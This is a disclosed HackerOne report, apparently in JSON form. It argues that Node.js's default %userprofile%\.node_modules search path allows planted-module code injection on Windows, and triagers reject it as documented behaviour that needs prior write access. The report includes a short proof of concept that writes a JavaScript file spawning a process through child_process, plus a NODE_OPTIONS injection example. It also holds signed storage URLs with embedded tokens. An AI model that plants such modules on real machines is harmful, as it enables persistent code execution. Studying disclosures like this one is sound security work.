{
    "id": 629879,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk4Nzk=",
    "url": "https://hackerone.com/reports/629879",
    "title": "loader.js is not secure",
    "state": "Closed",
    "substate": "not-applicable",
    "readable_substate": "N/A",
    "created_at": "2019-06-26T07:59:20.338Z",
    "submitted_at": "2019-06-26T07:59:20.338Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "cdpython",
        "url": "/cdpython",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 22984,
        "url": "https://hackerone.com/nodejs",
        "handle": "nodejs",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "permissions": [],
        "submission_state": "open",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": true,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "Node.js",
            "twitter_handle": "nodejs",
            "website": "https://nodejs.org",
            "about": "The Node.js JavaScript Runtime"
        }
    },
    "has_bounty?": false,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [],
    "singular_disclosure_disabled": true,
    "disclosed_at": "2020-06-11T12:19:49.586Z",
    "bug_reporter_agreed_on_going_public_at": "2020-06-11T12:19:49.543Z",
    "team_member_agreed_on_going_public_at": "2020-01-14T23:42:26.713Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "## Summary:\n\nNode.js `loader.js` can be exploited by an attacker \n\n## The vulnerability\n\n`https://github.com/nodejs/node/blob/a33c3c6d33fa81fa59a5aa95246d7f599e6abdd3/lib/internal/modules/cjs/loader.js#L892`\n\n```js\nModule._initPaths = function() {\n  var homeDir;\n  var nodePath;\n  if (isWindows) {\n    homeDir = process.env.USERPROFILE; //It can be vulnerable!\n    nodePath = process.env.NODE_PATH;\n  } else {\n    homeDir = safeGetenv('HOME');\n    nodePath = safeGetenv('NODE_PATH');\n  }\n\n  var prefixDir;\n\n  if (isWindows) {\n    prefixDir = path.resolve(process.execPath, '..');\n  } else {\n    prefixDir = path.resolve(process.execPath, '..', '..');\n  }\n  var paths = [path.resolve(prefixDir, 'lib', 'node')];\n\n  //can be easily exploited  \n  if (homeDir) {\n    paths.unshift(path.resolve(homeDir, '.node_libraries'));\n    paths.unshift(path.resolve(homeDir, '.node_modules'));\n  }\n\n  if (nodePath) {\n    paths = nodePath.split(path.delimiter).filter(function pathsFilterCB(path) {\n      return !!path;\n    }).concat(paths);\n  }\n\n  modulePaths = paths;\n\n  Module.globalPaths = modulePaths.slice(0);\n};\n```\n\n`loader.js` added `%userprofile\\.node_moduels` and `%userprofile\\.node_libraries` to globalPaths.\n\nIt means following behavior can occur easily when tries to `require`\n\nyou can test like below\n\n```js\nC:\\Users\\cdpyt\\OneDrive\\Desktop\\rce>node -v\nv12.4.0\n\nC:\\Users\\cdpyt\\OneDrive\\Desktop\\rce>node\nWelcome to Node.js v12.4.0.\nType \".help\" for more information.\n> require('a')\nThrown:\nError: Cannot find module 'a'\nRequire stack:\n- <repl>\n    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:623:15)\n    at Function.Module._load (internal/modules/cjs/loader.js:527:27)\n    at Module.require (internal/modules/cjs/loader.js:681:19)\n    at require (internal/modules/cjs/helpers.js:16:16) {\n  code: 'MODULE_NOT_FOUND',\n  requireStack: [ '<repl>' ]\n}\n>\n```\n\nIt looks like normal behavior. \n\nBut some side effect exists.\n\nF516992\n\nlet's test like below\n\n```cmd\nmkdir %userprofile%\\.node_modules\ncd %userprofile%\\.node_modules\necho const { exec } = require('child_process').exec(\"notepad\") > a.js\n\nC:\\Users\\cdpyt\\.node_modules>dir\n C 드라이브의 볼륨에는 이름이 없습니다.\n 볼륨 일련 번호: 1AAF-F852\n\n C:\\Users\\cdpyt\\.node_modules 디렉터리\n\n2019-06-26  오후 04:01    <DIR>          .\n2019-06-26  오후 04:01    <DIR>          ..\n2019-06-26  오후 04:01                60 a.js\n               1개 파일                  60 바이트\n```\n\nrun node and `require('a')`\n\nF516991\n\nIt is a really serious bug because many software uses nodes on Windows systems!\n\n`node` will attempt to install the library file under the node_modules in the current path or in the initialized path using `npm init`.\n\na special case is global installation with `npm install -g [package names]`\n\nglobal installation uses `%appdata%\\npm` path.\n\n```cmd\nC:\\Users\\cdpyt\\.node_modules>where eslint\nC:\\Users\\cdpyt\\AppData\\Roaming\\npm\\eslint\nC:\\Users\\cdpyt\\AppData\\Roaming\\npm\\eslint.cmd\n```\n\nSo, on a Windows system, `node` does not need to use `%userprofile\\.node_modules` and `%userprofile\\.node_libraries` paths in general cases.\n\n`node` has really powerful features on Windows. \n\nIf this bug is exploited by malicious code, AV can be easily bypassed.\n\n\n## Steps To Reproduce:\n\n  1. installation node latest version(v12.4.0) on windows\n  2. copy and paste below commands to `cmd.exe`\n        ``` cmd\n        mkdir %userprofile%\\.node_modules\n        cd %userprofile%\\.node_modules\n        echo const { exec } = require('child_process').exec(\"notepad\") > a.js\n        ```\n  3. run node and type `requrie('a')`\n  4. notpad.exe will be poped!\n\n\n## Suggested fix\n\n- Fix the `loader.js` \n```js\nif (isWindows) {\n    //homeDir = process.env.USERPROFILE;\n    nodePath = process.env.NODE_PATH;\n  } else {\n    homeDir = safeGetenv('HOME');\n    nodePath = safeGetenv('NODE_PATH');\n  }\n```\n\n## Supporting Material/References:\nThe executables were downloaded from the official web site.\n\n```cmd\nC:\\Users\\cdpyt\\.node_modules>node -v\nv12.4.0\n```\n\n## Impact\n\nIf `require` does not find the current path of the module, the node tries to search the global path.\n\n`%userprofile%` path allows you to create a new JavaScript file.\n\nIf the target application uses `node` or` electron` and does not do absolute path checking before `require` every time, it is dangerous for potential attacks.\n\nAttackers should target applications that fail to load library files. However, these behaviors are easy to find.\n\nAn attacker can create JavaScript files in a variety of ways. This is a more safe way to create pe files.\n\nAfter the creation to a specific path a javascript file, the target system will permanently infect.",
    "weakness": {
        "id": 70,
        "name": "Code Injection"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [
        {
            "id": 516991,
            "file_name": "notepad.PNG",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/991/f7dde5320f2a286081f5e24887f7e1588ceb0d0e/notepad.PNG?response-content-disposition=attachment%3B%20filename%3D%22notepad.PNG%22%3B%20filename%2A%3DUTF-8%27%27notepad.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072210Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd7a8e107f0231eec0b45708e2551e027ef6aea44a0b8a954804e57cdf3eee10",
            "file_size": 9370,
            "type": "image/png"
        },
        {
            "id": 516992,
            "file_name": "notfound.PNG",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/992/00270d740eb1095ef7ce9b383e84c211706e2347/notfound.PNG?response-content-disposition=attachment%3B%20filename%3D%22notfound.PNG%22%3B%20filename%2A%3DUTF-8%27%27notfound.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072210Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b21841cad0bce04fe3fbce8a967d046bfb1b4044df294cc333112142ab6aaeac",
            "file_size": 115430,
            "type": "image/png"
        }
    ],
    "allow_singular_disclosure_at": null,
    "vote_count": 3,
    "voters": [
        "brahim_boufakri01",
        "h2x0",
        "weebcunt"
    ],
    "structured_scope": {
        "databaseId": 666,
        "asset_type": "SOURCE_CODE",
        "asset_identifier": "https://github.com/nodejs/node",
        "max_severity": "critical"
    },
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 5200978,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "I'm not understanding how this is a security problem, since there appears to be no privilege escalation. If an attacker has write-access to the user's directories, don't they already have total control? The attackers can replace the node executable, they can replace any of the js files that comprise the application's source (instead of putting js files into the default require path as you demonstrate). Also, an attacker that controls the startup environment already has the ability to inject arbitrary code via NODE_OPTIONS. \n```\n% echo 'console.log(\"attack!\")' > r.js\n% node -e 'console.log(\"wave\")'\nwave\n% NODE_OPTIONS=\"-r ./r.js\" node -e 'console.log(\"wave\")'\nattack!\nwave\n```\n",
            "automated_response": false,
            "created_at": "2019-06-26T17:21:09.325Z",
            "updated_at": "2019-06-26T17:21:09.325Z",
            "actor": {
                "username": "octetcloud",
                "cleared": false,
                "verified": false,
                "url": "/octetcloud",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 5201241,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "hello! \nI'm not good at English. Please consider it.\n\nI understand and agree with your opinion. `node.js` itself is not a problem.\nHowever, many users use many applications built with `Electron`.\nand they use tons of third-party libraries.\nIn case, one of the libraries has a wrong code like\n```js\nxxx.js\n// doesn't exists current path `mytest.js`\nconst {awsome} = require('mytest');\n```\nabove code tries to search `%userprofile%\\.node_modules`. \nThis is because loader.js added the path.\n```js\n //can be easily exploited  \n  if (homeDir) {\n    paths.unshift(path.resolve(homeDir, '.node_libraries'));\n    paths.unshift(path.resolve(homeDir, '.node_modules'));\n  }\n```\nand then if i wrote  a file`%userprofile%\\.node_modules\\mytest.js`\n````js\necho const { exec } = require('child_process').exec(\"notepad\")\n```\nIn this case, you can continue to run arbitrary JavaScript code unlike adding environment variables.\n\non Windows system, ES5+ syntax javascript based malware does not exist.\nand the node.js has a powerful feature to interact with OS.\n\nI think can have a big problem in the node.js client ecosystem.\nYou can inject JavaScript code into software such as `slack, discord, vscode`\nBecause node.js already added  `%userprofile%\\.node_modules` and `%userprofile%\\.node_libraries` \n\nIf this software is installed in the path under `%ProgramFiles%` can be safer.\nWindows has a DACL\n\n```cmd\nC:\\Users\\cdpyt>icacls %userprofile%\nC:\\Users\\cdpyt NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n               BUILTIN\\Administrators:(OI)(CI)(F)\n               DESKTOP-H9K1B8N\\cdpyt:(OI)(CI)(F)\n               Everyone:(RX)\n```\n\n%userprofile% is writeable with `DESKTOP-H9K1B8N\\cdpyt:(OI)(CI)(F)` permission\n\n```\nC:\\Users\\cdpyt>icacls \"%ProgramFiles%\"\nC:\\Program Files NT SERVICE\\TrustedInstaller:(F)\n                 NT SERVICE\\TrustedInstaller:(CI)(IO)(F)\n                 NT AUTHORITY\\SYSTEM:(M)\n                 NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F)\n                 BUILTIN\\Administrators:(M)\n                 BUILTIN\\Administrators:(OI)(CI)(IO)(F)\n                 BUILTIN\\Users:(RX)\n                 BUILTIN\\Users:(OI)(CI)(IO)(GR,GE)\n                 CREATOR OWNER:(OI)(CI)(IO)(F)\n                 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX)\n                 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)\n                 APPLICATION PACKAGE AUTHORITY\\모든 제한된 응용 프로그램 패키지:(RX)\n                 APPLICATION PACKAGE AUTHORITY\\모든 제한된 응용 프로그램 패키지:(OI)(CI)(IO)(GR,GE)\n```\nCurrent user is `BUILTIN\\Users:(RX)` so I can't write under %ProgramFiles% path before gain administrator privileges.\n\nabove software are trying load to the module from the current installation path.\n\nin these cases, an attacker can not inject javascript code.\n\nbecause if an attacker writes to file under `%ProgramFiles%`, they need to bypass UAC.\n\nbut `node`  added `%userprofile%\\.node_modules` and `%userprofile%\\.node_libraries` \n\nso an attacker can write a file without UAC bypass.\n\nI've attached simple PoC.\n\nThank you.  \n\n\n\n",
            "automated_response": false,
            "created_at": "2019-06-26T18:20:59.638Z",
            "updated_at": "2019-06-26T18:20:59.638Z",
            "actor": {
                "username": "cdpython",
                "cleared": false,
                "verified": false,
                "url": "/cdpython",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "attachments": [
                {
                    "id": 517321,
                    "filename": "node.mp4",
                    "type": "video/mp4",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/321/8d97267e70fb98193d7aff281d88b92a12df0657/node.mp4?response-content-disposition=attachment%3B%20filename%3D%22node.mp4%22%3B%20filename%2A%3DUTF-8%27%27node.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072211Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6c3587625bb45e207bc527d36af85acd325d88f890f3c5622ba878c80a93461e"
                }
            ],
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 5201728,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Your English is perfectly understandable.\n\nTo be clear, this behaviour is documented and has existed for years: https://nodejs.org/api/modules.html#modules_loading_from_the_global_folders\n\n> \"I understand and agree with your opinion. node.js itself is not a problem. However, many users use many applications built with Electron.\"\n\nYou reported this to the Node.js project, not the Electron project. Shouldn't you report this as described in https://github.com/electron/electron/blob/master/SECURITY.md? They patch node, and could remove the global module paths.\n\n> I think can have a big problem in the node.js client ecosystem.\n> You can inject JavaScript code into software such as slack, discord, vscode\n\nYou cannot inject, not until the following unlikely scenario is arranged:\n1. A package exists that has an invalid (misspelled) require call\n2. The invalid require was never noticed, somehow. Global resolution occurs only if local resolution fails. On machines without the attack js in the global directories, both global and local resolution fails, and a fatal exception is thrown. How did this fatal exception not get noticed?\n3. An attacker has write access to the target user's home directories, and knows they are running an app with this problem.\n",
            "automated_response": false,
            "created_at": "2019-06-26T20:04:11.047Z",
            "updated_at": "2019-06-26T20:04:11.047Z",
            "actor": {
                "username": "octetcloud",
                "cleared": false,
                "verified": false,
                "url": "/octetcloud",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 5202987,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Good Morning! \n\nI already know an attacker without permission to a victim system cannot create javascript code. \n`Arbitrary file Write` is another vulnerability.\n\nBut I think this is a potential threat to the Windows node client.\nIt is similar to traditional Window DLL Hijacking.\n\nSo I just want to fix this issue. because this is can be exploited like my POC. F517321\n\nin Windows can do like this \nhttps://support.microsoft.com/en-au/help/2389418/secure-loading-of-libraries-to-prevent-dll-preloading-attacks\n```c\nDWORD retval = SearchPath(NULL, \"schannel\", \".dll\", err, result, NULL); \nHMODULE handle = LoadLibrary(result);\n```\n\nI think node also can do this before just added path.\n\n```js\nif (homeDir) {\n    [path.resolve(homeDir, '.node_libraries'),path.resolve(homeDir, '.node_modules')].map(\n\t(p) => fs.existsSync(p) ? \n                   paths.unshift(p) : \n                   console.log(`${p} is dosn't exsist on the system.`)\n    )\n}\n```\nabove code is safer because it verifies that the path exists before adding it.\n\nand I didn't know Electron has a deal with Security Issue.\n\nI will consider sending this issue to `Electron`\n\nthank you.",
            "automated_response": false,
            "created_at": "2019-06-27T02:30:06.392Z",
            "updated_at": "2019-06-27T02:30:06.392Z",
            "actor": {
                "username": "cdpython",
                "cleared": false,
                "verified": false,
                "url": "/cdpython",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 5206340,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugNotApplicable",
            "message": "Hi @cdpython,\n\nBased on your initial description, there do not appear to be any security implications as a direct result of this behavior. As already stated, this is a feature of Nodejs.\n\nYour effort is nonetheless appreciated and we wish that you'll continue to research and submit any future security issues you find. If you disagree, please reply with additional information describing your reasoning.\n\nKind regards,\n@beagle ",
            "automated_response": false,
            "created_at": "2019-06-27T14:01:55.743Z",
            "updated_at": "2019-06-27T14:01:55.743Z",
            "actor": {
                "username": "beagle",
                "cleared": false,
                "verified": false,
                "url": "/beagle",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 6772331,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-01-14T23:42:26.734Z",
            "updated_at": "2020-01-14T23:42:26.734Z",
            "first_to_agree": true,
            "actor": {
                "username": "octetcloud",
                "cleared": false,
                "verified": false,
                "url": "/octetcloud",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 8262997,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-06-11T12:19:49.565Z",
            "updated_at": "2020-06-11T12:19:49.565Z",
            "actor": {
                "username": "cdpython",
                "cleared": false,
                "verified": false,
                "url": "/cdpython",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        },
        {
            "id": 8262998,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportBecamePublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-06-11T12:19:49.612Z",
            "updated_at": "2020-06-11T12:19:49.612Z",
            "actor": {
                "username": "cdpython",
                "cleared": false,
                "verified": false,
                "url": "/cdpython",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}